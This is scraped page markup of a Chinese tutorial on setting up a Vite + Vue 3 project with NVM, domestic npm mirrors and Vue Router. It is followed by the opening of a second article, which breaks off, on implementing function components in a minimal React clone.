content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用 Vite + Vue 3 搭建项目并配置路由的全流程（含国内镜像加速）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/473218785740627/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AAA阿giao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:08:01.000Z" title="Sat Nov 22 2025 16:08:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>适用于 Windows / macOS / Linux 用户 | 包含 NVM 安装、Node 环境配置、Vite 项目创建、Vue Router 集成</strong></p>
<p>在现代前端开发中，<strong>Vite</strong> 凭借其极速的冷启动和热更新能力，已成为构建 Vue、React 等应用的首选工具。本文将手把手带你从零开始，<strong>使用国内镜像加速</strong>，通过 <strong>NVM 管理 Node.js 版本</strong>，创建一个基于 <strong>Vite + Vue 3</strong> 的项目，并集成 <strong>Vue Router</strong> 实现前端路由功能。</p>
<hr/>
<h2 data-id="heading-0">第一步：安装 NVM（Node Version Manager）</h2>
<p>NVM 是一个用于管理多个 Node.js 版本的工具，特别适合需要在不同项目中切换 Node 版本的开发者。</p>
<h3 data-id="heading-1">Windows 用户</h3>
<p>推荐使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoreybutler%2Fnvm-windows" title="https://github.com/coreybutler/nvm-windows" target="_blank" ref="nofollow noopener noreferrer">nvm-windows</a>：</p>
<ol>
<li>
<p>卸载已安装的 Node.js（如有）</p>
</li>
<li>
<p>下载安装包：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fcoreybutler%2Fnvm-windows%2Freleases" title="https://github.com/coreybutler/nvm-windows/releases" target="_blank" ref="nofollow noopener noreferrer">github.com/coreybutler…</a></p>
</li>
<li>
<p>安装时注意：</p>
<ul>
<li>安装路径不要包含空格（如 <code>C:\nvm</code>）</li>
<li>自动配置环境变量（勾选相关选项）</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">macOS / Linux 用户</h3>
<p>使用 curl 安装：</p>
<pre><code class="hljs language-bash" lang="bash">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
</code></pre>
<p>然后重启终端或执行：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">source</span> ~/.bashrc  <span class="hljs-comment"># 或 ~/.zshrc</span>
</code></pre>
<hr/>
<h2 data-id="heading-3">第二步：配置国内镜像源（加速下载）</h2>
<p>由于网络原因，从官方源下载 Node.js 和 npm 包可能非常慢。我们可以通过设置镜像地址解决。</p>
<h3 data-id="heading-4">设置 NVM 的 Node 和 npm 镜像（Windows）</h3>
<p>在命令行中执行以下命令（需以管理员身份运行 PowerShell 或 CMD）：</p>
<pre><code class="hljs language-ruby" lang="ruby">nvm npm_mirror <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/npmmirror.com/mirrors</span><span class="hljs-regexp">/npm/</span>
nvm node_mirror <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/npmmirror.com/mirrors</span><span class="hljs-regexp">/node/</span>
</code></pre>
<blockquote>
<p>这两行命令会修改 NVM 的默认下载源为 <strong>淘宝 NPM 镜像（npmmirror.com）</strong> ，大幅提升下载速度。</p>
</blockquote>
<blockquote>
<p>注意：<code>npmmirror.com</code> 是原 <code>npm.taobao.org</code> 的新域名，由阿里云维护。</p>
</blockquote>
<hr/>
<h2 data-id="heading-5">第三步：安装并使用指定版本的 Node.js</h2>
<h3 data-id="heading-6">1. 查看可用的 Node.js 版本</h3>
<pre><code class="hljs language-bash" lang="bash">nvm list available  <span class="hljs-comment"># Windows</span>
nvm ls-remote       <span class="hljs-comment"># macOS / Linux</span>
</code></pre>
<h3 data-id="heading-7">2. 安装推荐版本（如 LTS 版本 v18.18.2）</h3>
<pre><code class="hljs">nvm install 18.18.2
</code></pre>
<blockquote>
<p>推荐使用 <strong>LTS（长期支持）版本</strong>，稳定且兼容性好。</p>
</blockquote>
<h3 data-id="heading-8">3. 切换并使用该版本</h3>
<pre><code class="hljs language-perl" lang="perl">nvm <span class="hljs-keyword">use</span> <span class="hljs-number">18.18</span>.<span class="hljs-number">2</span>
</code></pre>
<p>验证是否生效：</p>
<pre><code class="hljs language-bash" lang="bash">node -v  <span class="hljs-comment"># 应输出 v18.18.2</span>
npm -v   <span class="hljs-comment"># 显示对应 npm 版本</span>
</code></pre>
<hr/>
<h2 data-id="heading-9">第四步：创建 Node.js 全局目录（可选但推荐）</h2>
<p>为避免权限问题和路径混乱，建议手动创建全局模块和缓存目录。</p>
<h3 data-id="heading-10">Windows 示例（以 C 盘为例）</h3>
<pre><code class="hljs language-arduino" lang="arduino">mkdir C:\nodejs\node_global
mkdir C:\nodejs\node_cache
</code></pre>
<p>然后配置 npm：</p>
<pre><code class="hljs language-swift" lang="swift">npm config <span class="hljs-keyword">set</span> <span class="hljs-keyword">prefix</span> <span class="hljs-string">"C:<span class="hljs-subst">\n</span>odejs<span class="hljs-subst">\n</span>ode_global"</span>
npm config <span class="hljs-keyword">set</span> cache <span class="hljs-string">"C:<span class="hljs-subst">\n</span>odejs<span class="hljs-subst">\n</span>ode_cache"</span>
</code></pre>
<h3 data-id="heading-11">将全局目录加入系统 PATH（Windows）</h3>
<ul>
<li>打开“系统属性” → “环境变量”</li>
<li>在 <strong>用户变量</strong> 的 <code>Path</code> 中添加：<code>C:\nodejs\node_global</code></li>
</ul>
<blockquote>
<p>这样你就可以全局使用 <code>vue</code>、<code>vite</code> 等命令了。</p>
</blockquote>
<hr/>
<h2 data-id="heading-12">第五步：配置 .npmrc 文件（提升后续安装速度）</h2>
<p>在用户主目录下（Windows 通常是 <code>C:\Users&lt;你的用户名&gt;</code>）创建或编辑 <code>.npmrc</code> 文件</p>
<p>.npmrc 文件在文章顶部下载</p>
<blockquote>
<p>✅ 此配置确保所有依赖（包括 sass、puppeteer 等）都从国内镜像下载。</p>
</blockquote>
<blockquote>
<p>💡 将此文件复制到 <code>C:\Users&lt;你的用户名&gt;.npmrc</code>（Windows）或 <code>~/.npmrc</code>（macOS/Linux）。</p>
</blockquote>
<hr/>
<h2 data-id="heading-13">第六步：使用 Vite 创建 Vue 3 项目</h2>
<p>现在一切准备就绪，开始创建项目！</p>
<h3 data-id="heading-14">执行创建命令</h3>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vite<span class="hljs-variable">@latest</span> my<span class="hljs-operator">-</span>app <span class="hljs-comment">-- --template vue</span>
</code></pre>
<blockquote>
<p>参数说明：</p>
<ul>
<li><code>my-app</code>：项目文件夹名称</li>
<li><code>--template vue</code>：指定使用 Vue 模板（纯 Vue 3，无 TypeScript、Router 等）</li>
</ul>
</blockquote>
<h3 data-id="heading-15">进入项目并安装依赖</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> my-app
npm install
</code></pre>
<blockquote>
<p>此时会从 <code>registry.npmmirror.com</code> 安装依赖，速度飞快！</p>
</blockquote>
<hr/>
<h2 data-id="heading-16">第七步：启动开发服务器</h2>
<pre><code class="hljs language-arduino" lang="arduino">npm run dev
</code></pre>
<p>你会看到类似输出：</p>
<pre><code class="hljs language-arduino" lang="arduino">  VITE v5<span class="hljs-number">.0</span><span class="hljs-number">.0</span>  ready in <span class="hljs-number">400</span> ms

  ➜  Local:   http:<span class="hljs-comment">//localhost:5173/</span>
  ➜  Network: http:<span class="hljs-comment">//192.168.x.x:5173/</span>
</code></pre>
<p>打开浏览器访问 <code>http://localhost:5173</code>，即可看到 Vue 的欢迎页面。</p>
<hr/>
<h2 data-id="heading-17">第八步：集成 Vue Router（实现页面路由）</h2>
<p>Vite 默认模板不包含路由，我们需要手动安装并配置。</p>
<h3 data-id="heading-18">1. 安装 Vue Router</h3>
<pre><code class="hljs language-css" lang="css">npm install vue-router<span class="hljs-keyword">@4</span>
</code></pre>
<blockquote>
<p>Vue 3 必须使用 <strong>vue-router 4.x</strong></p>
</blockquote>
<h3 data-id="heading-19">2. 创建路由配置文件</h3>
<p>在 <code>src</code> 目录下新建 <code>router/index.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 管理路由的文件 </span>
<span class="hljs-comment">// 导入组件</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'../views/user/login.vue'</span>  <span class="hljs-comment">// 登录组件</span>


<span class="hljs-comment">// 导入路由中的方法</span>
<span class="hljs-keyword">import</span> { createRouter, createWebHashHistory } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span>
<span class="hljs-comment">// 配置组件和访问路径</span>
<span class="hljs-keyword">const</span> routes = [
    { <span class="hljs-attr">path</span>: <span class="hljs-string">'/login'</span>, <span class="hljs-attr">component</span>: <span class="hljs-title class_">Login</span> }, <span class="hljs-comment">// /login是登录组件的访问路径，component表示组件的名称</span>

]
<span class="hljs-comment">// 创建路由对象</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createRouter</span>({
    <span class="hljs-comment">// 路由的数据</span>
    routes,
    <span class="hljs-attr">history</span>: <span class="hljs-title function_">createWebHashHistory</span>(), <span class="hljs-comment">// 路由模式，createWebHashHistory表示使用哈希模式</span>
})
<span class="hljs-comment">// 导出路由实例</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> router
</code></pre>
<blockquote>
<p>为什么用 <code>createWebHashHistory()</code>？</p>
<ul>
<li>它使用 URL 的 <code>#</code> 部分（如 <code>http://localhost:5173/#/about</code>）</li>
<li>不需要服务器配置，适合静态部署（如 GitHub Pages、Vercel、Netlify）</li>
</ul>
</blockquote>
<h3 data-id="heading-20">3. 在 main.js 中挂载路由</h3>
<p>修改 <code>src/main.js</code>：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'./style.css'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-comment">// 导入路由对象</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>
<span class="hljs-comment">// 创建项目对象</span>
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
<span class="hljs-comment">// 挂载路由对象</span>
app.<span class="hljs-title function_">use</span>(router)
<span class="hljs-comment">// 挂载组件</span>
app.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
</code></pre>
<h3 data-id="heading-21">4. 在 App.vue 中添加导航和路由出口</h3>
<p>修改 <code>src/App.vue</code>：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">RouterView</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">RouterView</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h3 data-id="heading-22">5. 重新运行项目</h3>
<pre><code class="hljs language-arduino" lang="arduino">npm run dev
</code></pre>
<p>现在点击“首页”和“关于”，页面内容会动态切换，说明路由已生效！</p>
<hr/>
<h2 data-id="heading-23">第九步：构建与部署（可选）</h2>
<p>开发完成后，构建生产版本：</p>
<pre><code class="hljs language-arduino" lang="arduino">npm run build
</code></pre>
<p>生成的 <code>dist/</code> 文件夹可直接部署到任何静态服务器（如 Nginx、GitHub Pages、Vercel 等）。</p>
<p>预览构建结果：</p>
<pre><code class="hljs language-arduino" lang="arduino">npm run preview
</code></pre>
<hr/>
<h2 data-id="heading-24">总结：完整流程回顾</h2>













































<table><thead><tr><th>步骤</th><th>操作</th></tr></thead><tbody><tr><td>1</td><td>安装 NVM（多版本 Node 管理）</td></tr><tr><td>2</td><td>配置国内镜像：<code>nvm node_mirror</code> 和 <code>nvm npm_mirror</code></td></tr><tr><td>3</td><td><code>nvm install 18.18.2</code> + <code>nvm use 18.18.2</code></td></tr><tr><td>4</td><td>创建全局目录并配置 PATH</td></tr><tr><td>5</td><td>复制 <code>.npmrc</code> 到用户目录，启用全量镜像</td></tr><tr><td>6</td><td><code>npm create vite@latest my-app -- --template vue</code></td></tr><tr><td>7</td><td><code>npm install</code> + <code>npm run dev</code></td></tr><tr><td>8</td><td>安装 <code>vue-router@4</code>，配置 <code>createWebHashHistory()</code></td></tr><tr><td>9</td><td>修改 <code>main.js</code> 和 <code>App.vue</code>，启用路由</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-25">小贴士</h2>
<ul>
<li>
<p>如果你希望使用 <strong>Vue 官方脚手架（带 Router/Pinia）</strong> ，也可以运行：</p>
<pre><code class="hljs language-sql" lang="sql">npm <span class="hljs-keyword">create</span> vue<span class="hljs-variable">@latest</span>
</code></pre>
<p>它会交互式让你选择是否集成 Router、Pinia、ESLint 等。</p>
</li>
<li>
<p>开发中遇到依赖安装慢？始终检查 <code>.npmrc</code> 是否生效：<code>npm config get registry</code></p>
</li>
<li>
<p>Vite 支持 TypeScript、JSX、CSS 预处理器等，按需扩展即可。</p>
</li>
</ul>
<hr/>
<p>至此，你已经成功搭建了一个<strong>高性能、可路由、国内加速优化</strong>的 Vue 3 项目！接下来就可以自由开发你的应用了。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[mini-react 实现function 组件]]></title>    <link>https://juejin.cn/post/7575104251865956362</link>    <guid>https://juejin.cn/post/7575104251865956362</guid>    <pubDate>2025-11-22T16:47:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575104251865956362" data-draft-id="7575083657994289179" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="mini-react 实现function 组件"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-22T16:47:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Holin_浩霖"/> <meta itemprop="url" content="https://juejin.cn/user/3984285872438743"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            mini-react 实现function 组件
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3984285872438743/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Holin_浩霖
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-22T16:47:08.000Z" title="Sat Nov 22 2025 16:47:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-22
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>代码结构如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/027b9628a3a048f08c14e391a4f886e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSG9saW5f5rWp6ZyW:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764434828&amp;x-signature=kGA8ItAe5cKa6X2XtXkuaJGuegU%3D" alt="" loading="lazy"/></p>
<ol>
<li>React.js 作用</li>
</ol>
<ul>
<li><strong>render()</strong> : 渲染入口，初始化根 Fiber 并启动调度</li>
</ul>

<ul>
<li><strong>createElement()</strong> : 将 JSX 转换为虚拟 DOM 对象</li>
</ul>

<ul>
<li><strong>workLoop()</strong> : 调度器，利用 requestIdleCallback 进行时间切片</li>
</ul>

<ul>
<li><strong>performUnitOfWork()</strong> : 处理单个 Fiber 工作单元</li>
</ul>

<ul>
<li><strong>commitRoot()</strong> : 提交阶段入口</li>
</ul>

<pre><code class="hljs language-diff" lang="diff">作用：实现一个非常精简的 Fiber 渲染器的核心逻辑（非完整实现，偏教学/探索用途）。
目标与分层：
<span class="hljs-deletion">- render(): 接收虚拟 DOM（由 JSX 或 createElement 创建），将整体渲染任务拆分为 fiber 工作单元并启动时间切片调度。</span>
<span class="hljs-deletion">- performUnitOfWork(): 在 render 阶段构建/链接 fiber 节点并创建真实 DOM（但不立即挂载到页面上，挂载在 commit 阶段统一处理以优化性能）。</span>
<span class="hljs-deletion">- commitRoot()/commitWork(): 将计算完成的 DOM 树统一提交到真实 DOM（避免 render 阶段频繁 DOM 操作）。</span>
重要约定（fiber 结构）：
<span class="hljs-deletion">- fiber.type: 节点类型（字符串标签或 'TEXT_ELEMENT'）。</span>
<span class="hljs-deletion">- fiber.props: 属性对象（包含 children 数组）。</span>
<span class="hljs-deletion">- fiber.dom: 对应的真实 DOM 节点（在 render 阶段 createDom 后创建）。</span>
<span class="hljs-deletion">- fiber.parent: 父 fiber 引用（用于 commit 时挂载）。</span>
<span class="hljs-deletion">- fiber.child: 第一个子 fiber 链接（深度优先处理顺序）。</span>
<span class="hljs-deletion">- fiber.sibling: 兄弟 fiber 链接（以支持广度上的顺序处理）。</span>
设计说明（简要）：
<span class="hljs-deletion">- 为支持页面响应性，渲染任务被拆分为多个小的工作单元（fiber），并通过 requestIdleCallback 的空闲时间片执行。</span>
<span class="hljs-deletion">- render 阶段只负责构建 DOM 节点并建立 fiber 链表（depth-first 构建），真正的 DOM 插入在 commit 阶段一次性完成。</span>
<span class="hljs-deletion">- 目前未</span>
</code></pre>
<p>JavaScript</p>
<ol start="2">
<li>ReactDom.js 作用：创建根节点</li>
</ol>
<ul>
<li><strong>createRoot()</strong> : 创建根节点，提供渲染接口</li>
</ul>
<ol start="3">
<li>fiberUtils.js 作用</li>
</ol>
<ul>
<li><strong>commitWork()</strong> : 递归挂载 Fiber 树到真实 DOM</li>
</ul>

<pre><code class="hljs language-sql" lang="sql">功能：实现 Fiber 提交阶段的操作（<span class="hljs-keyword">commit</span>），把 render 阶段构建的 fiber 树转为真实 DOM 结构。
说明：<span class="hljs-keyword">commit</span> 阶段的核心是把已存在且正确设置 props<span class="hljs-operator">/</span>dom 的 fiber 节点插入文档中。该模块将提交逻辑单独抽离，
以便让渲染逻辑和提交逻辑职责分离，且更容易进行单元测试。
</code></pre>
<p>JavaScript</p>
<ol start="4">
